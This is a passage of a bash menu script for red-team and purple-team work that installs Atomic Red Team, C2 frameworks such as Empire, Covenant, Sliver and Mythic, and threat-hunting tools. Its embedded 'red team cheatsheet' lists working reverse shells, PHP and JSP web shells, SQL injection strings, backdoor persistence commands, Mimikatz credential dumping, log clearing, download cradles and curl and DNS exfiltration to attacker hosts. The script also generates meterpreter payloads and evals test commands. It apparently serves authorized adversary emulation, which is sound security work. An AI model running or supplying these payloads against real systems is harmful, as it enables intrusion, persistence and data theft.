        log "INFO" "Atomic Red Team already exists"
        read -p "Update Atomic Red Team? (y/n): " update_choice
        if [[ "$update_choice" =~ [yY] ]]; then
            cd "$ATOMIC_RED_TEAM_DIR" || return 1
            git pull
            log "SUCCESS" "Atomic Red Team updated"
            cd - || return 1
        fi
        return 0
    fi
    
    git clone https://github.com/redcanaryco/atomic-red-team.git "$ATOMIC_RED_TEAM_DIR"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "Atomic Red Team installed successfully"
        
        # Install Invoke-AtomicRedTeam PowerShell module if on compatible system
        if command -v pwsh &> /dev/null; then
            log "INFO" "Installing Invoke-AtomicRedTeam PowerShell module..."
            pwsh -Command "Install-Module -Name invoke-atomicredteam -Force -Scope CurrentUser"
        fi
    else
        log "ERROR" "Failed to install Atomic Red Team"
        return 1
    fi
}

list_atomic_techniques() {
    local tactic=$1
    
    if [[ ! -d "$ATOMIC_RED_TEAM_DIR" ]]; then
        log "ERROR" "Atomic Red Team not installed"
        return 1
    fi
    
    log "INFO" "Listing techniques for tactic: $tactic"
    
    local technique_files=$(find "$ATOMIC_RED_TEAM_DIR/atomics" -name "T*.yaml" 2>/dev/null)
    
    if [[ -z "$technique_files" ]]; then
        log "ERROR" "No technique files found"
        return 1
    fi
    
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}              ATOMIC RED TEAM TECHNIQUES                        ${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    
    for file in $technique_files; do
        local technique_id=$(basename "$file" .yaml)
        if [[ -f "$file" ]]; then
            local technique_name=$(yq eval '.display_name // "Unknown"' "$file" 2>/dev/null)
            local test_count=$(yq eval '.atomic_tests | length' "$file" 2>/dev/null)
            
            echo -e "${BLUE}$technique_id${NC}: $technique_name"
            echo -e "  ${YELLOW}Tests available:${NC} $test_count"
            
            # Show first few test names
            local tests=$(yq eval '.atomic_tests[0:2][].name' "$file" 2>/dev/null)
            if [[ -n "$tests" ]]; then
                echo -e "  ${CYAN}Sample tests:${NC}"
                echo "$tests" | while read -r test; do
                    echo -e "    - $test"
                done
            fi
            echo
        fi
    done
}

run_atomic_test() {
    local technique_id=$1
    local test_guid=$2
    
    if [[ ! -d "$ATOMIC_RED_TEAM_DIR" ]]; then
        log "ERROR" "Atomic Red Team not installed"
        return 1
    fi
    
    local test_file="$ATOMIC_RED_TEAM_DIR/atomics/$technique_id/$technique_id.yaml"
    
    if [[ ! -f "$test_file" ]]; then
        log "ERROR" "Test file not found: $test_file"
        return 1
    fi
    
    log "INFO" "Analyzing test: $technique_id - $test_guid"
    
    # Extract test information
    local test_info=$(yq eval ".atomic_tests[] | select(.auto_generated_guid == \"$test_guid\")" "$test_file" 2>/dev/null)
    
    if [[ -z "$test_info" ]]; then
        log "ERROR" "Test with GUID $test_guid not found"
        return 1
    fi
    
    local test_name=$(echo "$test_info" | yq eval '.name')
    local test_description=$(echo "$test_info" | yq eval '.description')
    local executor=$(echo "$test_info" | yq eval '.executor.name')
    local command=$(echo "$test_info" | yq eval '.executor.command')
    
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                    ATOMIC TEST DETAILS                        ${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE}Technique:${NC} $technique_id"
    echo -e "${BLUE}Test Name:${NC} $test_name"
    echo -e "${BLUE}Description:${NC} $test_description"
    echo -e "${BLUE}Executor:${NC} $executor"
    echo -e "${BLUE}Command:${NC}"
    echo -e "${YELLOW}$command${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
    
    echo -e "${RED}⚠️  WARNING: This will execute potentially harmful commands! ⚠️${NC}"
    read -p "Are you sure you want to execute this test? (type 'EXECUTE' to confirm): " confirmation
    
    if [[ "$confirmation" == "EXECUTE" ]]; then
        log "WARNING" "Executing Atomic Test: $test_name"
        
        case $executor in
            "bash"|"sh")
                eval "$command"
                ;;
            "command_prompt")
                cmd.exe /c "$command"
                ;;
            "powershell")
                if command -v pwsh &> /dev/null; then
                    pwsh -Command "$command"
                else
                    powershell -Command "$command"
                fi
                ;;
            "python")
                python3 -c "$command"
                ;;
            *)
                log "ERROR" "Unsupported executor: $executor"
                return 1
                ;;
        esac
        
        if [[ $? -eq 0 ]]; then
            log "SUCCESS" "Test executed successfully"
        else
            log "ERROR" "Test execution failed"
        fi
    else
        log "INFO" "Test execution cancelled"
    fi
}

# ============================================================================
#                         C2 FRAMEWORK OPERATIONS
# ============================================================================

install_empire() {
    log "INFO" "Installing PowerShell Empire..."
    
    if [[ -d "$EMPIRE_DIR" ]]; then
        log "INFO" "Empire already exists"
        read -p "Update Empire? (y/n): " update_choice
        if [[ "$update_choice" =~ [yY] ]]; then
            cd "$EMPIRE_DIR" || return 1
            git pull
            pip3 install -r requirements.txt --upgrade
            log "SUCCESS" "Empire updated"
            cd - || return 1
        fi
        return 0
    fi
    
    git clone --recursive https://github.com/EmpireProject/Empire.git "$EMPIRE_DIR"
    
    if [[ $? -eq 0 ]]; then
        cd "$EMPIRE_DIR" || return 1
        pip3 install -r requirements.txt
        ./install.sh
        log "SUCCESS" "Empire installed successfully"
        cd - || return 1
    else
        log "ERROR" "Failed to install Empire"
        return 1
    fi
}

install_covenant() {
    log "INFO" "Installing Covenant C2..."
    
    if [[ -d "$COVENANT_DIR" ]]; then
        log "INFO" "Covenant already exists"
        return 0
    fi
    
    if ! command -v dotnet &> /dev/null; then
        log "INFO" "Installing .NET Core..."
        wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
        sudo dpkg -i packages-microsoft-prod.deb
        sudo apt-get update
        sudo apt-get install -y dotnet-sdk-6.0
    fi
    
    git clone --recurse-submodules https://github.com/cobbr/Covenant.git "$COVENANT_DIR"
    
    if [[ $? -eq 0 ]]; then
        cd "$COVENANT_DIR/Covenant" || return 1
        dotnet build
        log "SUCCESS" "Covenant installed successfully"
        cd - || return 1
    else
        log "ERROR" "Failed to install Covenant"
        return 1
    fi
}

install_sliver() {
    log "INFO" "Installing Sliver C2..."
    
    if [[ -f "$TOOLS_DIR/sliver-server" ]]; then
        log "INFO" "Sliver already installed"
        return 0
    fi
    
    local sliver_url=""
    case $(uname -m) in
        x86_64)
            sliver_url="https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux"
            ;;
        arm64|aarch64)
            sliver_url="https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux-arm64"
            ;;
        *)
            log "ERROR" "Unsupported architecture for Sliver"
            return 1
            ;;
    esac
    
    wget "$sliver_url" -O "$TOOLS_DIR/sliver-server"
    chmod +x "$TOOLS_DIR/sliver-server"
    
    if [[ $? -eq 0 ]]; then
        log "SUCCESS" "Sliver installed successfully"
    else
        log "ERROR" "Failed to install Sliver"
        return 1
    fi
}

install_mythic() {
    log "INFO" "Installing Mythic C2..."
    
    if [[ -d "$MYTHIC_DIR" ]]; then
        log "INFO" "Mythic already exists"
        return 0
    fi
    
    git clone https://github.com/its-a-feature/Mythic.git "$MYTHIC_DIR"
    
    if [[ $? -eq 0 ]]; then
        cd "$MYTHIC_DIR" || return 1
        sudo ./install_docker_ubuntu.sh
        make
        log "SUCCESS" "Mythic installed successfully"
        cd - || return 1
    else
        log "ERROR" "Failed to install Mythic"
        return 1
    fi
}

# ============================================================================
#                         PURPLE TEAM TOOLS
# ============================================================================

install_purple_team_tools() {
    log "INFO" "Installing Purple Team Tools..."
    
    # VECTR
    if [[ ! -d "$TOOLS_DIR/VECTR" ]]; then
        log "INFO" "Installing VECTR..."
        git clone https://github.com/SecurityRiskAdvisors/VECTR.git "$TOOLS_DIR/VECTR"
    fi
    
    # Atomic Purple
    if [[ ! -d "$TOOLS_DIR/atomic-purple" ]]; then
        log "INFO" "Installing Atomic Purple..."
        git clone https://github.com/mvelazc0/atomic-purple.git "$TOOLS_DIR/atomic-purple"
    fi
    
    # Mordor
    if [[ ! -d "$TOOLS_DIR/mordor" ]]; then
        log "INFO" "Installing Mordor..."
        git clone https://github.com/OTRF/mordor.git "$TOOLS_DIR/mordor"
    fi
    
    # Detection Lab
    if [[ ! -d "$TOOLS_DIR/DetectionLab" ]]; then
        log "INFO" "Installing Detection Lab..."
        git clone https://github.com/clong/DetectionLab.git "$TOOLS_DIR/DetectionLab"
    fi
    
    log "SUCCESS" "Purple Team Tools installation complete"
}

# ============================================================================
#                         THREAT HUNTING TOOLS
# ============================================================================

install_threat_hunting_tools() {
    log "INFO" "Installing Threat Hunting Tools..."
    
    # HELK
    if [[ ! -d "$TOOLS_DIR/HELK" ]]; then
        log "INFO" "Installing HELK..."
        git clone https://github.com/Cyb3rWard0g/HELK.git "$TOOLS_DIR/HELK"
    fi
    
    # Sigma Rules
    if [[ ! -d "$TOOLS_DIR/sigma" ]]; then
        log "INFO" "Installing Sigma Rules..."
        git clone https://github.com/SigmaHQ/sigma.git "$TOOLS_DIR/sigma"
    fi
    
    # ThreatHunter-Playbook
    if [[ ! -d "$TOOLS_DIR/ThreatHunter-Playbook" ]]; then
        log "INFO" "Installing ThreatHunter-Playbook..."
        git clone https://github.com/OTRF/ThreatHunter-Playbook.git "$TOOLS_DIR/ThreatHunter-Playbook"
    fi
    
    # Atomic Threat Coverage
    if [[ ! -d "$TOOLS_DIR/atomic-threat-coverage" ]]; then
        log "INFO" "Installing Atomic Threat Coverage..."
        git clone https://github.com/atc-project/atomic-threat-coverage.git "$TOOLS_DIR/atomic-threat-coverage"
    fi
    
    log "SUCCESS" "Threat Hunting Tools installation complete"
}

# ============================================================================
#                         ADVERSARY EMULATION
# ============================================================================

install_adversary_emulation_tools() {
    log "INFO" "Installing Adversary Emulation Tools..."
    
    # APTSimulator
    if [[ ! -d "$TOOLS_DIR/APTSimulator" ]]; then
        log "INFO" "Installing APTSimulator..."
        git clone https://github.com/NextronSystems/APTSimulator.git "$TOOLS_DIR/APTSimulator"
    fi
    
    # Metta
    if [[ ! -d "$TOOLS_DIR/Metta" ]]; then
        log "INFO" "Installing Metta..."
        git clone https://github.com/uber-common/metta.git "$TOOLS_DIR/Metta"
    fi
    
    # Red Team Automation (RTA)
    if [[ ! -d "$TOOLS_DIR/RTA" ]]; then
        log "INFO" "Installing Red Team Automation..."
        git clone https://github.com/endgameinc/RTA.git "$TOOLS_DIR/RTA"
    fi
    
    # Infection Monkey
    if [[ ! -d "$TOOLS_DIR/infection-monkey" ]]; then
        log "INFO" "Installing Infection Monkey..."
        git clone https://github.com/guardicore/monkey.git "$TOOLS_DIR/infection-monkey"
    fi
    
    log "SUCCESS" "Adversary Emulation Tools installation complete"
}

# ============================================================================
#                         SYSTEM UTILITIES
# ============================================================================

show_system_info() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                              SYSTEM INFORMATION                              ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${BLUE}Operating System:${NC}"
    if [[ -f /etc/os-release ]]; then
        source /etc/os-release
        echo "  Name: $PRETTY_NAME"
        echo "  ID: $ID"
        echo "  Version: $VERSION_ID"
    fi
    
    echo -e "\n${BLUE}Hardware:${NC}"
    echo "  Architecture: $(uname -m)"
    echo "  Processor: $(nproc) cores"
    echo "  Memory: $(free -h | awk '/^Mem:/ {print $2}')"
    echo "  Disk Space: $(df -h / | awk 'NR==2 {print $4}') available"
    
    echo -e "\n${BLUE}Network:${NC}"
    echo "  Hostname: $(hostname)"
    echo "  IP Addresses:"
    if command -v ip &> /dev/null; then
        ip addr show | grep -E 'inet ' | awk '{print "    " $2 " (" $NF ")"}'
    else
        ifconfig | grep -E 'inet ' | awk '{print "    " $2}'
    fi
    
    echo -e "\n${BLUE}Security Status:${NC}"
    echo "  Current User: $(whoami)"
    echo "  Groups: $(groups)"
    echo "  Sudo Access: $(sudo -l 2>/dev/null | grep -q '(ALL)' && echo "Yes" || echo "No")"
    
    echo -e "\n${BLUE}Installed Tools:${NC}"
    [[ -d "$CALDERA_DIR" ]] && echo "  ✓ MITRE Caldera" || echo "  ✗ MITRE Caldera"
    [[ -d "$ATOMIC_RED_TEAM_DIR" ]] && echo "  ✓ Atomic Red Team" || echo "  ✗ Atomic Red Team"
    [[ -d "$EMPIRE_DIR" ]] && echo "  ✓ PowerShell Empire" || echo "  ✗ PowerShell Empire"
    [[ -d "$COVENANT_DIR" ]] && echo "  ✓ Covenant C2" || echo "  ✗ Covenant C2"
    [[ -f "$TOOLS_DIR/sliver-server" ]] && echo "  ✓ Sliver C2" || echo "  ✗ Sliver C2"
    [[ -d "$MYTHIC_DIR" ]] && echo "  ✓ Mythic C2" || echo "  ✗ Mythic C2"
    
    read -p "Press Enter to continue..."
}

show_comprehensive_cheatsheet() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                       COMPREHENSIVE RED TEAM CHEATSHEET                     ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    cat << 'EOF'

═══════════════════════════════════════════════════════════════════════════════
                            RECONNAISSANCE PHASE
═══════════════════════════════════════════════════════════════════════════════

Network Discovery:
  nmap -sn 192.168.1.0/24                    # Ping sweep
  nmap -sS -O 192.168.1.1                    # SYN scan with OS detection
  nmap -sC -sV -oA scan 192.168.1.1          # Default scripts and version detection
  masscan -p1-65535 192.168.1.0/24 --rate=1000  # Fast port scanner

DNS Enumeration:
  dig axfr @dns-server domain.com             # Zone transfer
  dnsrecon -d domain.com -t axfr              # DNS reconnaissance
  fierce -dns domain.com                      # Domain scanner
  amass enum -d domain.com                    # Asset discovery

Web Application:
  gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
  ffuf -w wordlist.txt -u http://target/FUZZ  # Fast web fuzzer
  nikto -h http://target                      # Web vulnerability scanner
  whatweb http://target                       # Web technology identifier

Active Directory:
  enum4linux -a 192.168.1.1                  # SMB enumeration
  smbclient -L //192.168.1.1                 # List SMB shares
  rpcclient -U "" 192.168.1.1                # RPC client
  ldapsearch -x -h 192.168.1.1 -s base       # LDAP enumeration

═══════════════════════════════════════════════════════════════════════════════
                              INITIAL ACCESS
═══════════════════════════════════════════════════════════════════════════════

Reverse Shells:
  bash -i >& /dev/tcp/10.0.0.1/4444 0>&1     # Bash reverse shell
  nc -e /bin/sh 10.0.0.1 4444                # Netcat reverse shell
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Web Shells:
  <?php system($_GET['cmd']); ?>              # Simple PHP web shell
  <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>  # JSP web shell

SQL Injection:
  ' OR 1=1-- -                               # Basic SQLi
  ' UNION SELECT 1,2,3-- -                   # Union-based SQLi
  '; EXEC xp_cmdshell('whoami')-- -          # MSSQL command execution

═══════════════════════════════════════════════════════════════════════════════
                           PRIVILEGE ESCALATION
═══════════════════════════════════════════════════════════════════════════════

Linux:
  find / -perm -4000 -type f 2>/dev/null     # Find SUID binaries
  sudo -l                                     # Check sudo permissions
  cat /etc/passwd                            # Enumerate users
  ps aux | grep root                         # Check root processes
  crontab -l                                 # Check cron jobs
  find / -writable -type d 2>/dev/null       # Find writable directories

Windows:
  whoami /priv                               # Check privileges
  net user                                   # List users
  net localgroup administrators             # List admin users
  wmic qfe                                   # Check installed patches
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  icacls "C:\Program Files"                  # Check file permissions

Automated Tools:
  ./linpeas.sh                               # Linux privilege escalation
  ./winPEAS.exe                              # Windows privilege escalation
  ./linux-exploit-suggester.sh              # Linux kernel exploits
  .\Seatbelt.exe -group=all                 # Windows enumeration

═══════════════════════════════════════════════════════════════════════════════
                               PERSISTENCE
═══════════════════════════════════════════════════════════════════════════════

Linux:
  echo "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" >> ~/.bashrc
  (crontab -l; echo "*/10 * * * * /tmp/shell.sh") | crontab -
  ssh-keygen -t rsa; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

Windows:
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\backdoor.exe"
  schtasks /create /tn "Updater" /tr "C:\backdoor.exe" /sc minute /mo 10
  net user backdoor password123 /add; net localgroup administrators backdoor /add

═══════════════════════════════════════════════════════════════════════════════
                             CREDENTIAL ACCESS
═══════════════════════════════════════════════════════════════════════════════

Windows:
  sekurlsa::logonpasswords                   # Mimikatz - dump passwords
  lsadump::sam                               # Mimikatz - dump SAM
  privilege::debug; token::elevate; lsadump::secrets  # Mimikatz - dump secrets

Linux:
  cat /etc/shadow                            # Password hashes
  cat ~/.bash_history                        # Command history
  find / -name "*.key" -o -name "*.pem" 2>/dev/null  # SSH keys

Network:
  responder -I eth0 -rdwv                    # LLMNR/NBT-NS poisoning
  python3 ntlmrelayx.py -tf targets.txt -smb2support  # NTLM relay

═══════════════════════════════════════════════════════════════════════════════
                              LATERAL MOVEMENT
═══════════════════════════════════════════════════════════════════════════════

Pass-the-Hash:
  pth-winexe -U 'user%aad3b435b51404eeaad3b435b51404ee:hash' //target cmd
  impacket-psexec domain/user@target -hashes :hash

Remote Access:
  ssh user@target                            # SSH access
  rdesktop target:3389                       # RDP access
  impacket-wmiexec domain/user:pass@target   # WMI execution

File Transfer:
  scp file.txt user@target:/tmp/              # SCP transfer
  python3 -m http.server 8000                # Simple HTTP server
  certutil -urlcache -split -f http://attacker/file.exe file.exe  # Windows download

═══════════════════════════════════════════════════════════════════════════════
                               DEFENSE EVASION
═══════════════════════════════════════════════════════════════════════════════

Obfuscation:
  echo "command" | base64                    # Base64 encoding
  powershell -EncodedCommand $encoded       # PowerShell encoded command
  msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

Process Injection:
  Start-Process notepad; $proc = Get-Process notepad; [System.Diagnostics.Process]::EnterDebugMode()

Anti-Forensics:
  wevtutil cl Security                       # Clear Windows event logs
  history -c                                # Clear bash history
  rm ~/.bash_history                        # Delete bash history

═══════════════════════════════════════════════════════════════════════════════
                              COMMAND & CONTROL
═══════════════════════════════════════════════════════════════════════════════

PowerShell Empire:
  (New-Object System.Net.WebClient).DownloadString('http://server/empire') | IEX

Metasploit:
  use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp

Cobalt Strike:
  powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://server/a'))"

═══════════════════════════════════════════════════════════════════════════════
                                 EXFILTRATION
═══════════════════════════════════════════════════════════════════════════════

Data Staging:
  find / -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null | head -20
  tar -czf data.tar.gz /home/user/Documents/

Data Transfer:
  nc -l 4444 > data.tar.gz                  # Netcat listener
  curl -X POST -F "file=@data.tar.gz" http://attacker/upload
  scp data.tar.gz user@attacker:/tmp/

DNS Exfiltration:
  for i in $(cat data.txt); do nslookup $i.attacker.com; done

EOF
    
    read -p "Press Enter to continue..."
}

show_mitre_attack_matrix() {
    clear
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                           MITRE ATT&CK MATRIX                                ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    cat << 'EOF'

═══════════════════════════════════════════════════════════════════════════════
                              ENTERPRISE TACTICS
═══════════════════════════════════════════════════════════════════════════════

TA0043 - Reconnaissance
  T1595 - Active Scanning
  T1590 - Gather Victim Network Information
  T1589 - Gather Victim Identity Information

TA0042 - Resource Development
  T1583 - Acquire Infrastructure
  T1586 - Compromise Accounts
  T1584 - Compromise Infrastructure

TA0001 - Initial Access
  T1566 - Phishing
  T1190 - Exploit Public-Facing Application
  T1133 - External Remote Services

TA0002 - Execution
  T1059 - Command and Scripting Interpreter
  T1569 - System Services
  T1106 - Native API

TA0003 - Persistence
  T1547 - Boot or Logon Autostart Execution
  T1053 - Scheduled Task/Job
  T1136 - Create Account

TA0004 - Privilege Escalation
  T1548 - Abuse Elevation Control Mechanism
  T1055 - Process Injection
  T1068 - Exploitation for Privilege Escalation

TA0005 - Defense Evasion
  T1027 - Obfuscated Files or Information
  T1055 - Process Injection
  T1562 - Impair Defenses

TA0006 - Credential Access
  T1003 - OS Credential Dumping
  T1110 - Brute Force
  T1558 - Steal or Forge Kerberos Tickets

TA0007 - Discovery
  T1083 - File and Directory Discovery
  T1057 - Process Discovery
  T1018 - Remote System Discovery

TA0008 - Lateral Movement
  T1021 - Remote Services
  T1210 - Exploitation of Remote Services
  T1534 - Internal Spearphishing

TA0009 - Collection
  T1005 - Data from Local System
  T1113 - Screen Capture
  T1115 - Clipboard Data

TA0011 - Command and Control
  T1071 - Application Layer Protocol
  T1573 - Encrypted Channel
  T1090 - Proxy

TA0010 - Exfiltration
  T1041 - Exfiltration Over C2 Channel
  T1048 - Exfiltration Over Alternative Protocol
  T1567 - Exfiltration Over Web Service

TA0040 - Impact
  T1485 - Data Destruction
  T1486 - Data Encrypted for Impact
  T1490 - Inhibit System Recovery

EOF
    
    read -p "Press Enter to continue..."
}

# ============================================================================
#                              MENU SYSTEMS
# ============================================================================

show_caldera_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                          MITRE CALDERA OPERATIONS                           ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install/Setup Caldera${NC}"
        echo -e "2.  ${BLUE}Update Caldera${NC}"
        echo -e "3.  ${BLUE}Start Caldera Server${NC}"
        echo -e "4.  ${BLUE}Stop Caldera Server${NC}"
        echo -e "5.  ${BLUE}Install Additional Plugins${NC}"
        echo -e "6.  ${BLUE}View Caldera Logs${NC}"
        echo -e "7.  ${BLUE}Caldera Configuration${NC}"
        echo -e "8.  ${BLUE}Open Caldera Web Interface${NC}"
        echo -e "9.  ${BLUE}View Documentation${NC}"
        echo -e "10. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-10]: ${NC}"
        read caldera_choice
        
        case $caldera_choice in
            1) install_caldera; read -p "Press Enter to continue...";;
            2) update_caldera; read -p "Press Enter to continue...";;
            3) start_caldera; read -p "Press Enter to continue...";;
            4) stop_caldera; read -p "Press Enter to continue...";;
            5) install_caldera_plugins; read -p "Press Enter to continue...";;
            6) 
                if [[ -f "$CALDERA_DIR/logs/caldera.log" ]]; then
                    tail -f "$CALDERA_DIR/logs/caldera.log"
                else
                    log "WARNING" "No Caldera logs found"
                fi
                ;;
            7) 
                if [[ -f "$CALDERA_DIR/conf/local.yml" ]]; then
                    ${EDITOR:-nano} "$CALDERA_DIR/conf/local.yml"
                else
                    log "ERROR" "Configuration file not found"
                fi
                ;;
            8) 
                if command -v xdg-open &> /dev/null; then
                    xdg-open "http://localhost:8888" 2>/dev/null
                elif command -v open &> /dev/null; then
                    open "http://localhost:8888" 2>/dev/null
                fi
                log "INFO" "Opening http://localhost:8888 in browser"
                ;;
            9) 
                if command -v xdg-open &> /dev/null; then
                    xdg-open "https://caldera.readthedocs.io/" 2>/dev/null
                elif command -v open &> /dev/null; then
                    open "https://caldera.readthedocs.io/" 2>/dev/null
                fi
                ;;
            10) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 10."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_atomic_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                         ATOMIC RED TEAM OPERATIONS                          ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install/Update Atomic Red Team${NC}"
        echo -e "2.  ${BLUE}List All Techniques${NC}"
        echo -e "3.  ${BLUE}Search Techniques${NC}"
        echo -e "4.  ${BLUE}Run Specific Test${NC}"
        echo -e "5.  ${BLUE}Browse by Tactic${NC}"
        echo -e "6.  ${BLUE}Generate Test Report${NC}"
        echo -e "7.  ${BLUE}View Documentation${NC}"
        echo -e "8.  ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-8]: ${NC}"
        read atomic_choice
        
        case $atomic_choice in
            1) install_atomic_red_team; read -p "Press Enter to continue...";;
            2) list_atomic_techniques "all"; read -p "Press Enter to continue...";;
            3) 
                read -p "Enter search term: " search_term
                grep -r "$search_term" "$ATOMIC_RED_TEAM_DIR/atomics" --include="*.yaml" 2>/dev/null
                read -p "Press Enter to continue..."
                ;;
            4) 
                read -p "Enter Technique ID (e.g., T1059): " tech_id
                read -p "Enter Test GUID or leave blank to list: " test_guid
                if [[ -z "$test_guid" ]]; then
                    list_atomic_techniques "$tech_id"
                else
                    run_atomic_test "$tech_id" "$test_guid"
                fi
                read -p "Press Enter to continue..."
                ;;
            5) 
                echo "Available Tactics:"
                echo "1. Execution (TA0002)"
                echo "2. Persistence (TA0003)"
                echo "3. Privilege Escalation (TA0004)"
                echo "4. Defense Evasion (TA0005)"
                echo "5. Credential Access (TA0006)"
                echo "6. Discovery (TA0007)"
                echo "7. Lateral Movement (TA0008)"
                echo "8. Collection (TA0009)"
                read -p "Select tactic number: " tactic_num
                case $tactic_num in
                    1) list_atomic_techniques "TA0002";;
                    2) list_atomic_techniques "TA0003";;
                    3) list_atomic_techniques "TA0004";;
                    4) list_atomic_techniques "TA0005";;
                    5) list_atomic_techniques "TA0006";;
                    6) list_atomic_techniques "TA0007";;
                    7) list_atomic_techniques "TA0008";;
                    8) list_atomic_techniques "TA0009";;
                esac
                read -p "Press Enter to continue..."
                ;;
            6) 
                log "INFO" "Generating Atomic Red Team test report..."
                echo "Test report functionality would be implemented here"
                read -p "Press Enter to continue..."
                ;;
            7) 
                if command -v xdg-open &> /dev/null; then
                    xdg-open "https://atomicredteam.io/" 2>/dev/null
                elif command -v open &> /dev/null; then
                    open "https://atomicredteam.io/" 2>/dev/null
                fi
                ;;
            8) break;;
            *) 
                log "ERROR" "Invalid choice. Please enter a number between 1 and 8."
                read -p "Press Enter to continue..."
                ;;
        esac
    done
}

show_c2_menu() {
    while true; do
        clear
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║                         COMMAND & CONTROL FRAMEWORKS                        ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
        echo -e "1.  ${BLUE}Install PowerShell Empire${NC}"
        echo -e "2.  ${BLUE}Install Covenant C2${NC}"
        echo -e "3.  ${BLUE}Install Sliver C2${NC}"
        echo -e "4.  ${BLUE}Install Mythic C2${NC}"
        echo -e "5.  ${BLUE}Start Empire Server${NC}"
        echo -e "6.  ${BLUE}Start Covenant Server${NC}"
        echo -e "7.  ${BLUE}Start Sliver Server${NC}"
        echo -e "8.  ${BLUE}Start Mythic Server${NC}"
        echo -e "9.  ${BLUE}Generate Payloads${NC}"
        echo -e "10. ${BLUE}Back to Main Menu${NC}"
        echo -e "${GREEN}═══════════════════════════════════════════════════════════════════════════════${NC}"
        echo -n -e "${YELLOW}Enter your choice [1-10]: ${NC}"
        read c2_choice
        
        case $c2_choice in
            1) install_empire; read -p "Press Enter to continue...";;
            2) install_covenant; read -p "Press Enter to continue...";;
            3) install_sliver; read -p "Press Enter to continue...";;
            4) install_mythic; read -p "Press Enter to continue...";;
            5) 
                if [[ -d "$EMPIRE_DIR" ]]; then
                    cd "$EMPIRE_DIR" && python3 empire &
                    EMPIRE_PID=$!
                    log "SUCCESS" "Empire started with PID $EMPIRE_PID"
                else
                    log "ERROR" "Empire not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            6) 
                if [[ -d "$COVENANT_DIR" ]]; then
                    cd "$COVENANT_DIR/Covenant" && dotnet run &
                    COVENANT_PID=$!
                    log "SUCCESS" "Covenant started with PID $COVENANT_PID"
                else
                    log "ERROR" "Covenant not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            7) 
                if [[ -f "$TOOLS_DIR/sliver-server" ]]; then
                    "$TOOLS_DIR/sliver-server" &
                    log "SUCCESS" "Sliver server started"
                else
                    log "ERROR" "Sliver not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            8) 
                if [[ -d "$MYTHIC_DIR" ]]; then
                    cd "$MYTHIC_DIR" && make start
                    log "SUCCESS" "Mythic server started"
                else
                    log "ERROR" "Mythic not installed"
                fi
                read -p "Press Enter to continue..."
                ;;
            9) 
                echo "Payload generation options:"
                echo "1. MSFVenom payloads"
                echo "2. Empire stagers"
                echo "3. Sliver implants"
                read -p "Select option: " payload_choice
                case $payload_choice in
                    1) 
                        read -p "Enter LHOST: " lhost
                        read -p "Enter LPORT: " lport
                        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o payload.exe
                        log "SUCCESS" "Payload generated as payload.exe"
                        ;;
                    2) log "INFO" "Empire stager generation would be implemented";;
                    3) log "INFO" "Sliver implant generation would be implemented";;
                esac
                read -p "Press Enter to continue..."
                ;;
            10) break;;
            *) 
